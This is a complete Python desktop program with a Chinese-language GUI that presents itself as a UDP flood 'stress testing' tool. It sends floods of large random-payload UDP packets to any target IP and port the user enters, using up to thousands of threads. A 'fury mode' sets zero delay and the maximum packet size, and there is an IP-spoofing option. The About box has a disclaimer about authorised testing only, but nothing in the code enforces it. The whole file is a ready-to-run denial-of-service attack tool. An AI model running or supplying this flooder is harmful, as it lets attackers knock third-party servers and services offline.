import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import socket
import threading
import time
import json
import os
import queue
from datetime import datetime
import sys
import webbrowser
import ipaddress


class UDPFloodTester:
    def __init__(self, root):
        self.root = root
        self.root.title("专业UDP Flood测试工具 v2.1 (支持IPv6)")
        self.root.geometry("1200x950")
        self.running = False
        self.attack_threads = []
        self.packet_count = 0
        self.success_count = 0
        self.failure_count = 0
        self.last_update_time = time.time()
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.config_file = "udp_flood_config.json"
        self.fury_mode = False

        # 初始化样式
        self.style = ttk.Style()
        self.style.configure("Fury.TButton", foreground="red", font=('Helvetica', 10, 'bold'))
        self.style.configure("Normal.TButton", font=('Helvetica', 10))
        self.style.configure("TCombobox", font=('Helvetica', 9))

        self.create_widgets()
        self.load_config()
        self.start_log_updater()

    def create_widgets(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        main_frame.columnconfigure(0, weight=1)

        # 配置区域
        top_frame = ttk.LabelFrame(main_frame, text="测试配置 (设置UDP Flood参数)", padding=(15, 10))
        top_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), padx=5, pady=5)

        # IP版本选择
        ttk.Label(top_frame, text="IP版本:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.ip_version = tk.StringVar(value="IPv4")
        self.ip_version_menu = ttk.Combobox(top_frame, textvariable=self.ip_version,
                                          values=["IPv4", "IPv6"], width=5)
        self.ip_version_menu.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)

        # 目标IP输入框
        ttk.Label(top_frame, text="目标IP (要测试的服务器IP地址):").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.ip_entry = ttk.Entry(top_frame, width=40)
        self.ip_entry.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)

        # 目标端口
        ttk.Label(top_frame, text="目标端口 (UDP端口号):").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.port_spin = ttk.Spinbox(top_frame, from_=1, to=65535, width=12)
        self.port_spin.set(53)  # 默认DNS端口
        self.port_spin.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        # 线程数
        ttk.Label(top_frame, text="线程数 (并发发送UDP包的数量，建议50-500):").grid(row=2, column=0, sticky=tk.W, padx=5,
                                                                                   pady=5)
        self.threads_spin = ttk.Spinbox(top_frame, from_=1, to=2000, width=12)
        self.threads_spin.set(50)
        self.threads_spin.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        # 持续时间
        ttk.Label(top_frame, text="持续时间(秒) (测试运行的总时长，0表示无限制):").grid(row=3, column=0, sticky=tk.W,
                                                                                       padx=5, pady=5)
        self.duration_spin = ttk.Spinbox(top_frame, from_=0, to=86400, width=12)
        self.duration_spin.set(60)
        self.duration_spin.grid(row=3, column=1, sticky=tk.W, padx=5, pady=5)

        # 发包间隔
        ttk.Label(top_frame, text="发包间隔(ms) (每个UDP包间的延迟时间，0表示无延迟):").grid(row=4, column=0,
                                                                                            sticky=tk.W, padx=5, pady=5)
        self.interval_spin = ttk.Spinbox(top_frame, from_=0, to=10000, width=12)
        self.interval_spin.set(100)
        self.interval_spin.grid(row=4, column=1, sticky=tk.W, padx=5, pady=5)

        # 包大小
        ttk.Label(top_frame, text="包大小(字节) (每个UDP包的数据大小):").grid(row=1, column=2, sticky=tk.W, padx=5,
                                                                              pady=5)
        self.packet_size_spin = ttk.Spinbox(top_frame, from_=1, to=65507, width=12)  # UDP最大有效载荷
        self.packet_size_spin.set(1024)
        self.packet_size_spin.grid(row=1, column=3, sticky=tk.W, padx=5, pady=5)

        # 高级选项
        ttk.Label(top_frame, text="高级选项 (配置UDP Flood特性):").grid(row=2, column=2, sticky=tk.W, padx=5, pady=5)

        self.random_payload = tk.BooleanVar(value=True)
        ttk.Checkbutton(top_frame,
                        text="随机数据负载 (每个包使用随机数据)",
                        variable=self.random_payload).grid(row=2, column=3, sticky=tk.W, padx=5, pady=5)

        self.spoof_ip = tk.BooleanVar(value=False)
        ttk.Checkbutton(top_frame,
                        text="IP欺骗 (随机源IP地址，需要root权限)",
                        variable=self.spoof_ip).grid(row=3, column=3, sticky=tk.W, padx=5, pady=5)

        # 数据负载区域
        payload_frame = ttk.LabelFrame(main_frame, text="数据负载 (设置UDP包内容)", padding=(15, 10))
        payload_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), padx=5, pady=10)

        self.payload_text = scrolledtext.ScrolledText(payload_frame, width=120, height=8, wrap=tk.WORD,
                                                      font=('Consolas', 9))
        self.payload_text.pack(fill=tk.BOTH, expand=True)

        # 默认负载 - DNS查询示例
        default_payload = "模拟DNS查询负载数据"
        self.payload_text.insert(tk.END, default_payload)

        # 控制按钮
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=3, column=0, sticky=(tk.W, tk.E), padx=5, pady=15)

        self.start_btn = ttk.Button(button_frame, text="▶ 开始测试", command=self.start_test, width=12)
        self.start_btn.pack(side=tk.LEFT, padx=10)

        self.fury_btn = ttk.Button(button_frame, text="💢 狂暴模式", style="Normal.TButton",
                                   command=self.toggle_fury_mode, width=12)
        self.fury_btn.pack(side=tk.LEFT, padx=10)

        self.stop_btn = ttk.Button(button_frame, text="⏹ 停止测试", command=self.stop_test, state=tk.DISABLED, width=12)
        self.stop_btn.pack(side=tk.LEFT, padx=10)

        self.save_btn = ttk.Button(button_frame, text="💾 保存配置", command=self.save_config, width=12)
        self.save_btn.pack(side=tk.LEFT, padx=10)

        self.load_btn = ttk.Button(button_frame, text="📂 加载配置", command=self.load_config_dialog, width=12)
        self.load_btn.pack(side=tk.LEFT, padx=10)

        self.clear_btn = ttk.Button(button_frame, text="🧹 清除日志", command=self.clear_logs, width=12)
        self.clear_btn.pack(side=tk.LEFT, padx=10)

        self.about_btn = ttk.Button(button_frame, text="ℹ️ 关于", command=self.show_about, width=12)
        self.about_btn.pack(side=tk.LEFT, padx=10)

        # 状态信息
        status_frame = ttk.LabelFrame(main_frame, text="测试状态 (实时测试信息显示区)", padding=(15, 10))
        status_frame.grid(row=4, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5, pady=10)

        self.status_text = scrolledtext.ScrolledText(
            status_frame,
            width=130,
            height=15,
            wrap=tk.WORD,
            font=('Consolas', 9),
            state='normal'
        )
        self.status_text.pack(fill=tk.BOTH, expand=True)

        # 统计信息
        stats_frame = ttk.Frame(status_frame)
        stats_frame.pack(fill=tk.X, pady=10)

        ttk.Label(stats_frame, text="总包数:").pack(side=tk.LEFT, padx=10)
        self.total_label = ttk.Label(stats_frame, text="0", width=10)
        self.total_label.pack(side=tk.LEFT, padx=5)

        ttk.Label(stats_frame, text="成功:").pack(side=tk.LEFT, padx=10)
        self.success_label = ttk.Label(stats_frame, text="0", foreground="green", width=10)
        self.success_label.pack(side=tk.LEFT, padx=5)

        ttk.Label(stats_frame, text="失败:").pack(side=tk.LEFT, padx=10)
        self.failure_label = ttk.Label(stats_frame, text="0", foreground="red", width=10)
        self.failure_label.pack(side=tk.LEFT, padx=5)

        ttk.Label(stats_frame, text="PPS (每秒包数):").pack(side=tk.LEFT, padx=10)
        self.pps_label = ttk.Label(stats_frame, text="0.00", width=15)
        self.pps_label.pack(side=tk.LEFT, padx=5)

        ttk.Label(stats_frame, text="带宽(MB/s):").pack(side=tk.LEFT, padx=10)
        self.bandwidth_label = ttk.Label(stats_frame, text="0.00", width=12)
        self.bandwidth_label.pack(side=tk.LEFT, padx=5)

        ttk.Label(stats_frame, text="已运行:").pack(side=tk.LEFT, padx=10)
        self.elapsed_label = ttk.Label(stats_frame, text="00:00:00", width=12)
        self.elapsed_label.pack(side=tk.LEFT, padx=5)

        # 底部状态栏
        self.status_bar = ttk.Label(main_frame,
                                    text="🟢 就绪 (等待开始测试)",
                                    relief=tk.SUNKEN,
                                    anchor=tk.W)
        self.status_bar.grid(row=5, column=0, sticky=(tk.W, tk.E), padx=5, pady=5)

    def toggle_fury_mode(self):
        """切换狂暴模式状态"""
        self.fury_mode = not self.fury_mode
        if self.fury_mode:
            self.fury_btn.config(style="Fury.TButton")
            self.log_message("⚠️ 狂暴模式已激活 - 将自动配置极限参数")
            self.status_bar.config(text="🔴 狂暴模式已激活")
        else:
            self.fury_btn.config(style="Normal.TButton")
            self.log_message("狂暴模式已关闭")
            self.status_bar.config(text="🟢 普通模式")

    def start_log_updater(self):
        """日志更新线程"""

        def log_updater():
            while True:
                try:
                    msg = self.log_queue.get_nowait()
                    self.status_text.insert(tk.END, msg)
                    self.status_text.see(tk.END)
                    self.status_text.update()
                except queue.Empty:
                    pass

                try:
                    stats = self.stats_queue.get_nowait()
                    self.total_label.config(text=str(stats['total']))
                    self.success_label.config(text=str(stats['success']))
                    self.failure_label.config(text=str(stats['failure']))
                    self.pps_label.config(text=f"{stats['pps']:.2f}")
                    self.bandwidth_label.config(text=f"{stats['bandwidth']:.2f}")
                    self.elapsed_label.config(text=stats['elapsed'])
                except queue.Empty:
                    pass

                time.sleep(0.1)

        threading.Thread(target=log_updater, daemon=True).start()

    def log_message(self, message):
        """记录带时间戳的日志"""
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.log_queue.put(f"[{timestamp}] {message}\n")

    def update_stats_display(self):
        """更新统计信息显示"""
        elapsed_seconds = time.time() - self.start_time if hasattr(self, 'start_time') else 0
        elapsed_str = time.strftime('%H:%M:%S', time.gmtime(elapsed_seconds))

        pps = 0
        bandwidth = 0
        if elapsed_seconds > 0:
            pps = self.packet_count / elapsed_seconds
            packet_size = int(self.packet_size_spin.get())
            bandwidth = (self.packet_count * packet_size) / (elapsed_seconds * 1024 * 1024)  # MB/s

        self.stats_queue.put({
            'total': self.packet_count,
            'success': self.success_count,
            'failure': self.failure_count,
            'pps': pps,
            'bandwidth': bandwidth,
            'elapsed': elapsed_str
        })

    def load_config(self, filename=None):
        """加载配置文件"""
        filename = filename or self.config_file
        try:
            if os.path.exists(filename):
                with open(filename, "r") as f:
                    config = json.load(f)

                    self.ip_version.set(config.get("ip_version", "IPv4"))
                    self.ip_entry.delete(0, tk.END)
                    self.ip_entry.insert(0, config.get("ip", ""))

                    self.port_spin.delete(0, tk.END)
                    self.port_spin.insert(0, config.get("port", 53))

                    self.threads_spin.delete(0, tk.END)
                    self.threads_spin.insert(0, config.get("threads", 50))

                    self.duration_spin.delete(0, tk.END)
                    self.duration_spin.insert(0, config.get("duration", 60))

                    self.interval_spin.delete(0, tk.END)
                    self.interval_spin.insert(0, config.get("interval", 100))

                    self.packet_size_spin.delete(0, tk.END)
                    self.packet_size_spin.insert(0, config.get("packet_size", 1024))

                    self.random_payload.set(config.get("random_payload", True))
                    self.spoof_ip.set(config.get("spoof_ip", False))

                    self.payload_text.delete(1.0, tk.END)
                    self.payload_text.insert(tk.END, config.get("payload", ""))

                self.log_message(f"✅ 配置已从 {filename} 加载")
                return True
        except Exception as e:
            self.log_message(f"❌ 加载配置失败: {str(e)}")
            return False

    def load_config_dialog(self):
        """打开文件对话框加载配置"""
        filename = filedialog.askopenfilename(
            title="选择配置文件",
            filetypes=[("JSON文件", "*.json"), ("所有文件", "*.*")],
            initialdir=os.path.dirname(os.path.abspath(self.config_file)))
        if filename:
            self.load_config(filename)

    def save_config(self, filename=None):
        """保存当前配置到文件"""
        filename = filename or self.config_file
        try:
            config = {
                "ip_version": self.ip_version.get(),
                "ip": self.ip_entry.get(),
                "port": self.port_spin.get(),
                "threads": self.threads_spin.get(),
                "duration": self.duration_spin.get(),
                "interval": self.interval_spin.get(),
                "packet_size": self.packet_size_spin.get(),
                "random_payload": self.random_payload.get(),
                "spoof_ip": self.spoof_ip.get(),
                "payload": self.payload_text.get(1.0, tk.END).strip()
            }

            with open(filename, "w") as f:
                json.dump(config, f, indent=4)

            self.log_message(f"✅ 配置已保存到 {filename}")
            return True
        except Exception as e:
            self.log_message(f"❌ 保存配置失败: {str(e)}")
            return False

    def clear_logs(self):
        """清除日志内容"""
        self.status_text.delete(1.0, tk.END)
        self.log_message("🧹 日志已清除")

    def validate_ip(self, ip):
        """验证IP地址格式"""
        try:
            if self.ip_version.get() == "IPv6":
                ipaddress.IPv6Address(ip)
            else:
                ipaddress.IPv4Address(ip)
            return True
        except ValueError:
            self.log_message(f"❌ IP地址验证失败: {ip} 不是有效的{self.ip_version.get()}地址")
            return False

    def start_test(self):
        """开始UDP Flood测试"""
        if self.fury_mode:
            # 自动配置狂暴模式参数
            self.threads_spin.delete(0, tk.END)
            self.threads_spin.insert(0, "50")
            self.interval_spin.delete(0, tk.END)
            self.interval_spin.insert(0, "0")
            self.packet_size_spin.delete(0, tk.END)
            self.packet_size_spin.insert(0, "65507")  # 最大UDP包大小
            self.random_payload.set(True)
            self.spoof_ip.set(False)  # 狂暴模式默认不开启IP欺骗

            self.log_message("⚡ 狂暴模式参数已自动配置：")
            self.log_message("  线程数 = 50 | 发包间隔 = 0ms")
            self.log_message("  包大小 = 65507字节 | 随机负载 = 开启")

        ip = self.ip_entry.get().strip()
        if not ip:
            messagebox.showerror("错误", "请输入目标IP地址")
            return

        if not self.validate_ip(ip):
            messagebox.showerror("错误", f"无效的{self.ip_version.get()}地址格式")
            return

        port = int(self.port_spin.get())
        if port < 1 or port > 65535:
            messagebox.showerror("错误", "端口号必须在1-65535之间")
            return

        # 重置统计计数器
        self.packet_count = 0
        self.success_count = 0
        self.failure_count = 0
        self.start_time = time.time()
        self.running = True

        # 更新UI状态
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_bar.config(text="🔴 测试运行中...")

        # 记录启动信息
        ip_version = self.ip_version.get()
        self.log_message(f"🚀 开始UDP Flood测试 - 目标: {ip}:{port} ({ip_version})")
        self.log_message(f"  线程数: {self.threads_spin.get()} | 持续时间: {self.duration_spin.get()}秒")
        self.log_message(f"  包大小: {self.packet_size_spin.get()}字节 | 间隔: {self.interval_spin.get()}ms")

        # 创建攻击线程
        thread_count = int(self.threads_spin.get())
        for i in range(thread_count):
            t = threading.Thread(target=self.run_flood, daemon=True)
            t.start()
            self.attack_threads.append(t)

        # 设置测试计时器
        duration = int(self.duration_spin.get())
        if duration > 0:
            self.stop_timer = threading.Timer(duration, self.stop_test)
            self.stop_timer.start()

    def stop_test(self):
        """停止UDP Flood测试"""
        if not self.running:
            return

        self.running = False

        # 取消计时器
        if hasattr(self, 'stop_timer'):
            self.stop_timer.cancel()

        # 等待所有线程结束
        for t in self.attack_threads:
            t.join(1.0)

        self.attack_threads = []

        # 计算统计数据
        elapsed_time = time.time() - self.start_time
        elapsed_str = time.strftime('%H:%M:%S', time.gmtime(elapsed_time))
        pps = self.packet_count / elapsed_time if elapsed_time > 0 else 0
        packet_size = int(self.packet_size_spin.get())
        bandwidth = (self.packet_count * packet_size) / (elapsed_time * 1024 * 1024) if elapsed_time > 0 else 0  # MB/s

        # 更新UI状态
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_bar.config(text="🟢 测试完成")

        # 输出测试结果
        self.log_message("\n📊 测试结果:")
        self.log_message(f"  总包数: {self.packet_count}")
        success_rate = (self.success_count / self.packet_count) * 100 if self.packet_count > 0 else 0
        self.log_message(f"  成功发送: {self.success_count} ({success_rate:.2f}%)")
        failure_rate = (self.failure_count / self.packet_count) * 100 if self.packet_count > 0 else 0
        self.log_message(f"  失败发送: {self.failure_count} ({failure_rate:.2f}%)")
        self.log_message(f"  平均PPS: {pps:.2f} 包/秒")
        self.log_message(f"  平均带宽: {bandwidth:.2f} MB/s")
        self.log_message(f"  总耗时: {elapsed_str}")

        # 更新统计显示
        self.update_stats_display()

    def generate_random_payload(self, size):
        """生成随机数据负载"""
        if self.random_payload.get():
            # 生成随机字节数据
            return os.urandom(size)
        else:
            # 使用用户定义的负载，如果不够长则填充随机数据
            payload = self.payload_text.get(1.0, tk.END).strip().encode('utf-8')
            if len(payload) >= size:
                return payload[:size]
            else:
                return payload + os.urandom(size - len(payload))

    def run_flood(self):
        """执行UDP Flood的核心方法"""
        target_ip = self.ip_entry.get().strip()
        target_port = int(self.port_spin.get())
        interval = float(self.interval_spin.get()) / 1000.0
        packet_size = int(self.packet_size_spin.get())
        ip_version = self.ip_version.get()

        if self.fury_mode:
            # 狂暴模式专用参数
            while self.running:
                try:
                    # 根据IP版本创建套接字
                    if ip_version == "IPv6":
                        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    # 设置超时以避免阻塞
                    sock.settimeout(0.1)

                    # 生成随机数据
                    payload = self.generate_random_payload(packet_size)

                    # 发送UDP包
                    sock.sendto(payload, (target_ip, target_port))

                    # 更新计数器
                    self.packet_count += 1
                    self.success_count += 1

                    # 关闭套接字
                    sock.close()

                    # 定期记录
                    if self.packet_count % 1000 == 0:
                        self.log_message(f"⚡ 狂暴模式已发送 {self.packet_count} UDP包")

                except Exception as e:
                    self.packet_count += 1
                    self.failure_count += 1
                    error_type = type(e).__name__
                    if self.packet_count % 100 == 0:
                        self.log_message(f"❌ 发送失败 [{error_type}: {str(e)}]")

                # 定期更新统计显示
                if time.time() - self.last_update_time > 0.5:
                    self.update_stats_display()
                    self.last_update_time = time.time()
        else:
            # 普通模式
            while self.running:
                try:
                    # 根据IP版本创建套接字
                    if ip_version == "IPv6":
                        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    # 设置超时以避免阻塞
                    sock.settimeout(0.1)

                    # 生成数据负载
                    payload = self.generate_random_payload(packet_size)

                    # 发送UDP包
                    sock.sendto(payload, (target_ip, target_port))

                    # 更新计数器
                    self.packet_count += 1
                    self.success_count += 1

                    # 关闭套接字
                    sock.close()

                    # 定期记录
                    if self.packet_count % 100 == 0:
                        self.log_message(f"✅ 成功发送 {self.packet_count} UDP包")

                except Exception as e:
                    self.packet_count += 1
                    self.failure_count += 1
                    error_type = type(e).__name__
                    if self.packet_count % 100 == 0:
                        self.log_message(f"❌ 发送失败 [{error_type}: {str(e)}]")

                # 定期更新统计显示
                if time.time() - self.last_update_time > 0.5:
                    self.update_stats_display()
                    self.last_update_time = time.time()

                # 发包间隔
                if interval > 0:
                    time.sleep(interval)

    def show_about(self):
        """显示关于对话框"""
        about_window = tk.Toplevel(self.root)
        about_window.title("关于")
        about_window.geometry("500x420")
        about_window.resizable(False, False)

        main_frame = ttk.Frame(about_window, padding=20)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # 图标和标题
        icon_label = ttk.Label(main_frame, text="⚡", font=('Helvetica', 24))
        icon_label.pack(pady=5)

        title_label = ttk.Label(main_frame,
                                text="UDP Flood测试工具 v2.1",
                                font=('Helvetica', 16, 'bold'))
        title_label.pack(pady=5)

        # 作者信息
        author_label = ttk.Label(main_frame,
                                 text="作者: NanYanM",
                                 font=('Helvetica', 12))
        author_label.pack(pady=5)

        # 说明文本
        about_text = tk.Text(main_frame,
                             wrap=tk.WORD,
                             height=12,
                             padx=10,
                             pady=10,
                             font=('Helvetica', 10))
        about_text.pack(fill=tk.BOTH, expand=True)

        about_content = """功能说明:

• 专业UDP Flood压力测试工具
• 支持IPv4和IPv6协议
• 支持普通模式和狂暴模式
• 可自定义UDP包大小和内容
• 可视化测试结果统计

UDP Flood特点:

- 无连接协议，不需要握手
- 不可靠传输，不保证送达
- 常用于DNS、VoIP等应用
- 最大包大小: 65507字节

免责声明:

本工具仅限合法授权测试使用
未经授权测试他人系统属于违法行为
使用者需自行承担所有法律责任
"""
        about_text.insert(tk.END, about_content)
        about_text.config(state=tk.DISABLED)

        # 按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)

        bilibili_btn = ttk.Button(
            button_frame,
            text="访问作者B站",
            command=lambda: webbrowser.open("https://space.bilibili.com/3494375101302875​")
        )
        bilibili_btn.pack(side=tk.LEFT, padx=10, expand=True)

        close_btn = ttk.Button(
            button_frame,
            text="关闭",
            command=about_window.destroy
        )
        close_btn.pack(side=tk.RIGHT, padx=10, expand=True)

        about_window.grab_set()


if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = UDPFloodTester(root)


        def on_closing():
            if app.running:
                if messagebox.askokcancel("退出", "测试仍在运行，确定要退出吗？"):
                    app.stop_test()
                    root.destroy()
            else:
                root.destroy()


        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.mainloop()
    except Exception as e:
        print(f"程序启动错误啦！: {str(e)}")
        sys.exit(1)